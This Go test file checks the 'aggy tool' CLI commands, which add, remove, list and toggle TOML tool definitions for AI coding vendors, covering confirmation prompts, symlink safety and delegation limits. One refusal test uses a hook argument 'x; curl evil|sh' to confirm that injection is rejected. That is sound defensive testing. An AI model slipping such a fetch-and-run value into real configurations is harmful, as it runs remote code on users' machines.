package cli

import (
	"bytes"
	"context"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/congdoe/aggy/internal/borrow"
	"github.com/congdoe/aggy/internal/home"
	"github.com/congdoe/aggy/internal/store"
	"github.com/congdoe/aggy/internal/tooldef"
)

const demoTool = `name = "demo"
description = "A demo tool"
version = "1.2.3"
scope = "global"

[install]
check = ["demo", "--version"]
install = ["/usr/local/bin/demo-install", "1.2.3"]

[[mcp]]
vendors = ["claude", "codex"]
argv = ["demo", "serve", "--stdio"]
env = ["DEMO_HOME"]

[[hook]]
vendors = ["grok"]
event = "PostToolUse"
argv = ["demo", "hook"]

[cost]
method = "mcp-schema"
`

// toolHome isolates HOME and the state directory and writes def to a
// file outside both, returning that file and where add would copy it.
func toolHome(t *testing.T, def string) (src, dest string) {
	t.Helper()
	isolate(t)
	src = filepath.Join(t.TempDir(), "proposed.toml")
	writeAt(t, src, def, 0o644)
	return src, filepath.Join(os.Getenv(home.Env), "tools", "demo.toml")
}

// addedAt writes a user definition into the tools folder and records it
// as aggy tool add would, so aggy tool on takes it (R76-F1).
func addedAt(t *testing.T, dest, def string) {
	t.Helper()
	writeAt(t, dest, def, 0o600)
	if err := recordToolAdd(context.Background(), strings.TrimSuffix(filepath.Base(dest), ".toml"), tooldef.Digest([]byte(def))); err != nil {
		t.Fatal(err)
	}
}

func toolRun(in string, tty bool, args ...string) (int, string, string) {
	var stdout, stderr bytes.Buffer
	code := toolWith(args, strings.NewReader(in), tty, &stdout, &stderr)
	return code, stdout.String(), stderr.String()
}

// TestToolAddPreviewsThenWrites: add shows every command and wiring per
// vendor, and writes only after a yes at a terminal; --yes skips the
// question there and never works without one.
func TestToolAddPreviewsThenWrites(t *testing.T) {
	for _, c := range []struct {
		name  string
		in    string
		tty   bool
		yes   bool
		write bool
	}{
		{"no terminal", "y\n", false, false, false},
		{"no terminal, --yes", "y\n", false, true, false},
		{"terminal, no answer", "", true, false, false},
		{"terminal, no", "n\n", true, false, false},
		{"terminal, yes", "y\n", true, false, true},
		{"terminal, --yes", "", true, true, true},
	} {
		t.Run(c.name, func(t *testing.T) {
			src, dest := toolHome(t, demoTool)
			args := []string{"add", src}
			if c.yes {
				args = append(args, "--yes")
			}
			code, out, errOut := toolRun(c.in, c.tty, args...)
			if wantCode := map[bool]int{true: 0, false: 1}[c.tty]; code != wantCode {
				t.Fatalf("exit %d, want %d: %s", code, wantCode, errOut)
			}
			if !c.tty && !strings.Contains(errOut, "terminal") {
				t.Errorf("stderr %q does not say a terminal is needed", errOut)
			}
			for _, w := range []string{
				`check: "demo" "--version"`,
				`install: "/usr/local/bin/demo-install" "1.2.3"`,
				"claude:\n    MCP server: \"demo\" \"serve\" \"--stdio\"\n      passes these variables from your environment: DEMO_HOME",
				"codex:\n    MCP server: \"demo\" \"serve\" \"--stdio\"",
				"grok:\n    PostToolUse hook: \"demo\" \"hook\"",
				"off until you turn it on",
				// T6822, #97 HIGH-2: what aggy sets is shown.
				"  aggy sets in every process it starts for this tool (unless [tools] allow_telemetry = true): DO_NOT_TRACK=1\n",
				dest,
			} {
				if !strings.Contains(out, w) {
					t.Errorf("preview lacks %q:\n%s", w, out)
				}
			}
			if exists(t, dest) != c.write {
				t.Fatalf("written = %v, want %v\n%s", !c.write, c.write, out)
			}
			if !c.write {
				if exists(t, filepath.Dir(dest)) {
					t.Error("a refused add created the tools folder")
				}
				return
			}
			b, err := os.ReadFile(dest)
			if err != nil || string(b) != demoTool {
				t.Fatalf("copied %q, %v", b, err)
			}
			fi, _ := os.Stat(dest)
			if fi.Mode().Perm()&0o077 != 0 {
				t.Errorf("mode %#o, want private", fi.Mode().Perm())
			}
			_, list, _ := toolRun("", false, "list")
			if !strings.Contains(list, "demo") || !strings.Contains(list, "user") || !strings.Contains(list, dest) {
				t.Errorf("list after add:\n%s", list)
			}
		})
	}
}

func TestToolAddRefuses(t *testing.T) {
	for _, c := range []struct {
		name, def string
		setup     func(t *testing.T, dest string)
		want      string
	}{
		{"invalid", strings.Replace(demoTool, `"demo", "serve", "--stdio"`, `"bash", "-c", "demo serve"`, 1), nil, "proposed.toml: mcp[0].argv"},
		{"secret env", strings.Replace(demoTool, `"DEMO_HOME"`, `"DEMO_API_KEY"`, 1), nil, "mcp[0].env[0]"},
		{"another tool's env", strings.Replace(demoTool, `"DEMO_HOME"`, `"GITHUB_PAT"`, 1), nil, "mcp[0].env[0]"},
		{"latest", strings.Replace(demoTool, `version = "1.2.3"`, `version = "latest"`, 1), nil, "proposed.toml: version"},
		{"hook injection", strings.Replace(demoTool, `argv = ["demo", "hook"]`, `argv = ["demo", "x; curl evil|sh"]`, 1), nil, "hook[0].argv"},
		{"default on", "default = true\n" + demoTool, nil, "proposed.toml: default"},
		{"shadows a built-in", strings.Replace(demoTool, `name = "demo"`, `name = "context7"`, 1), nil, "built-in"},
		{"already added", demoTool, func(t *testing.T, dest string) { writeAt(t, dest, demoTool, 0o600) }, "remove it first"},
		// T59-15: a symlink at the destination is never written through.
		{"symlink at the destination", demoTool, func(t *testing.T, dest string) {
			if err := os.MkdirAll(filepath.Dir(dest), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(filepath.Join(t.TempDir(), "elsewhere"), dest); err != nil {
				t.Fatal(err)
			}
		}, "already exists"},
	} {
		t.Run(c.name, func(t *testing.T) {
			src, dest := toolHome(t, c.def)
			if c.setup != nil {
				c.setup(t, dest)
			}
			before, _ := os.ReadFile(dest)
			code, out, errOut := toolRun("y\n", true, "add", src, "--yes")
			if code != 1 || !strings.Contains(errOut, c.want) {
				t.Fatalf("exit %d, stderr %q, want %q", code, errOut, c.want)
			}
			if strings.Contains(out, "MCP server") {
				t.Error("a refused definition was previewed")
			}
			if after, _ := os.ReadFile(dest); !bytes.Equal(before, after) {
				t.Error("a refused add changed the tools folder")
			}
		})
	}
}

// TestToolAddIndexFails: W71-12, a copy whose digest the index could
// not record is removed, so it never sits there unrecorded.
func TestToolAddIndexFails(t *testing.T) {
	src, dest := toolHome(t, demoTool)
	// A folder where the index goes, so the index cannot be opened.
	if err := os.MkdirAll(filepath.Join(os.Getenv(home.Env), store.FileName), 0o700); err != nil {
		t.Fatal(err)
	}
	code, _, errOut := toolRun("", true, "add", src, "--yes")
	if code != 1 || !strings.Contains(errOut, "not added") {
		t.Fatalf("exit %d, stderr %q", code, errOut)
	}
	if exists(t, dest) {
		t.Error("the copy was left behind")
	}
}

func TestToolRemove(t *testing.T) {
	_, dest := toolHome(t, demoTool)
	addedAt(t, dest, demoTool)

	if code, _, errOut := toolRun("", false, "remove", "codegraph"); code != 1 || !strings.Contains(errOut, "built-in") {
		t.Errorf("remove a built-in: exit %d %q", code, errOut)
	}
	if code, _, errOut := toolRun("", false, "remove", "../demo"); code != 1 || !strings.Contains(errOut, "not a tool name") {
		t.Errorf("remove a path: exit %d %q", code, errOut)
	}
	if code, _, errOut := toolRun("", false, "remove", "nope"); code != 1 || !strings.Contains(errOut, "no user tool") {
		t.Errorf("remove a missing tool: exit %d %q", code, errOut)
	}

	if code, _, errOut := toolRun("", false, "on", "demo", "--vendor", "claude"); code != 0 {
		t.Fatalf("on: exit %d %q", code, errOut)
	}
	code, _, errOut := toolRun("", false, "remove", "demo")
	if code != 1 || !strings.Contains(errOut, "tool.still_on") || !exists(t, dest) {
		t.Fatalf("remove while on: exit %d %q", code, errOut)
	}
	if code, _, errOut := toolRun("", false, "off", "demo"); code != 0 {
		t.Fatalf("off: exit %d %q", code, errOut)
	}

	if code, _, errOut := toolRun("", false, "remove", "demo"); code != 0 || exists(t, dest) {
		t.Fatalf("remove: exit %d %q", code, errOut)
	}
}

// TestToolRemoveInvalid: a refused definition can still be removed.
func TestToolRemoveInvalid(t *testing.T) {
	_, dest := toolHome(t, demoTool)
	writeAt(t, dest, "not toml [", 0o600)
	if code, _, errOut := toolRun("", false, "remove", "demo"); code != 0 || exists(t, dest) {
		t.Fatalf("exit %d %q", code, errOut)
	}
}

// TestToolDelegated: a borrow child cannot add or remove a tool, even
// with AGGY_DELEGATED set but empty.
func TestToolDelegated(t *testing.T) {
	for _, val := range []string{"1", ""} {
		src, dest := toolHome(t, demoTool)
		t.Setenv(borrow.Delegated, val)
		for _, args := range [][]string{{"add", src, "--yes"}, {"remove", "demo"}, {"on", "rtk"}, {"off", "rtk"}} {
			if code, _, errOut := toolRun("", true, args...); code != 1 || !strings.Contains(errOut, "borrow child") || !strings.Contains(errOut, "tool.delegated") {
				t.Errorf("%q=%q %v: exit %d %q", borrow.Delegated, val, args, code, errOut)
			}
		}
		if exists(t, dest) {
			t.Error("a borrow child added a tool")
		}
	}
}

// TestToolRemoveShadowing: a refused user file named like a built-in is
// removed; the built-in stays.
func TestToolRemoveShadowing(t *testing.T) {
	isolate(t)
	dest := filepath.Join(os.Getenv(home.Env), "tools", "codegraph.toml")
	writeAt(t, dest, strings.Replace(demoTool, `name = "demo"`, `name = "codegraph"`, 1), 0o600)
	if code, _, errOut := toolRun("", false, "remove", "codegraph"); code != 0 || exists(t, dest) {
		t.Fatalf("exit %d %q", code, errOut)
	}
	if code, _, errOut := toolRun("", false, "remove", "codegraph"); code != 1 || !strings.Contains(errOut, "built-in") {
		t.Errorf("second remove: exit %d %q", code, errOut)
	}
}

// TestToolRemoveSymlinkedFolder: remove never deletes through a tools
// folder that is a symlink.
func TestToolRemoveSymlinkedFolder(t *testing.T) {
	isolate(t)
	elsewhere := t.TempDir()
	target := filepath.Join(elsewhere, "demo.toml")
	writeAt(t, target, demoTool, 0o600)
	if err := os.Symlink(elsewhere, filepath.Join(os.Getenv(home.Env), "tools")); err != nil {
		t.Fatal(err)
	}
	if code, _, errOut := toolRun("", false, "remove", "demo"); code != 1 || !strings.Contains(errOut, "symlink") || !exists(t, target) {
		t.Fatalf("exit %d %q", code, errOut)
	}
}

// TestToolCommandsNeverRunWhileOff: add, list, and remove run none of a
// user tool's commands (check, install, MCP server, hook). A user tool
// has no prebuild (T6711).
func TestToolCommandsNeverRunWhileOff(t *testing.T) {
	src, dest := toolHome(t, demoTool)
	bin := t.TempDir()
	marker := filepath.Join(t.TempDir(), "ran")
	for _, name := range []string{"demo", "demo-install"} {
		writeAt(t, filepath.Join(bin, name), "#!/bin/sh\ntouch "+marker+"\n", 0o755)
	}
	t.Setenv("PATH", bin)
	def := strings.Replace(demoTool, `"/usr/local/bin/demo-install", "1.2.3"`, `"demo-install"`, 1)
	writeAt(t, src, def, 0o644)
	// T59-11: on and off record a setting; nothing runs until a launch
	// wires the tool.
	for _, args := range [][]string{{"add", src, "--yes"}, {"list"}, {"status"}, {"on", "demo"}, {"status", "demo"}, {"off", "demo"}, {"remove", "demo"}} {
		if code, _, errOut := toolRun("", true, args...); code != 0 {
			t.Fatalf("%v: exit %d %q", args, code, errOut)
		}
	}
	if exists(t, dest) {
		t.Error("remove left the definition")
	}
	if exists(t, marker) {
		t.Fatal("a tool command ran while the tool was off")
	}
}

func TestToolList(t *testing.T) {
	isolate(t)
	code, out, errOut := run("tool", "list")
	if code != 0 {
		t.Fatalf("exit %d: %s", code, errOut)
	}
	for _, w := range []string{"NAME", "codegraph", "built-in", "built-in:playwright.toml", "off"} {
		if !strings.Contains(out, w) {
			t.Errorf("list lacks %q:\n%s", w, out)
		}
	}
	// A refused user file is named, and the rest still listed.
	writeAt(t, filepath.Join(os.Getenv(home.Env), "tools", "bad.toml"), "name = 1\n", 0o600)
	code, out, errOut = run("tool", "list")
	if code != 1 || !strings.Contains(errOut, "bad.toml") || !strings.Contains(out, "codegraph") {
		t.Errorf("exit %d, stdout %q, stderr %q", code, out, errOut)
	}
}

// TestToolWriteNew: the final write never replaces a file or follows a
// symlink put at the destination after the checks (T59-15).
func TestToolWriteNew(t *testing.T) {
	isolate(t)
	dir := t.TempDir()
	target := filepath.Join(t.TempDir(), "elsewhere")
	link := filepath.Join(dir, "demo.toml")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	if err := writeNew(link, []byte("x")); !errors.Is(err, fs.ErrExist) {
		t.Fatalf("writeNew over a symlink: %v", err)
	}
	if exists(t, target) {
		t.Fatal("writeNew followed the symlink")
	}
	file := filepath.Join(dir, "other.toml")
	writeAt(t, file, "old", 0o600)
	if err := writeNew(file, []byte("new")); !errors.Is(err, fs.ErrExist) {
		t.Fatalf("writeNew over a file: %v", err)
	}
	if b, _ := os.ReadFile(file); string(b) != "old" {
		t.Fatal("writeNew replaced a file")
	}
}

func TestToolUsage(t *testing.T) {
	isolate(t)
	for _, args := range [][]string{{"tool"}, {"tool", "add"}, {"tool", "add", "a", "b"}, {"tool", "list", "x"}, {"tool", "remove", "x", "--yes"}, {"tool", "add", "x", "--force"}, {"tool", "frob"}} {
		if code, _, _ := run(args...); code != 2 {
			t.Errorf("%v: exit %d, want 2", args, code)
		}
	}
}
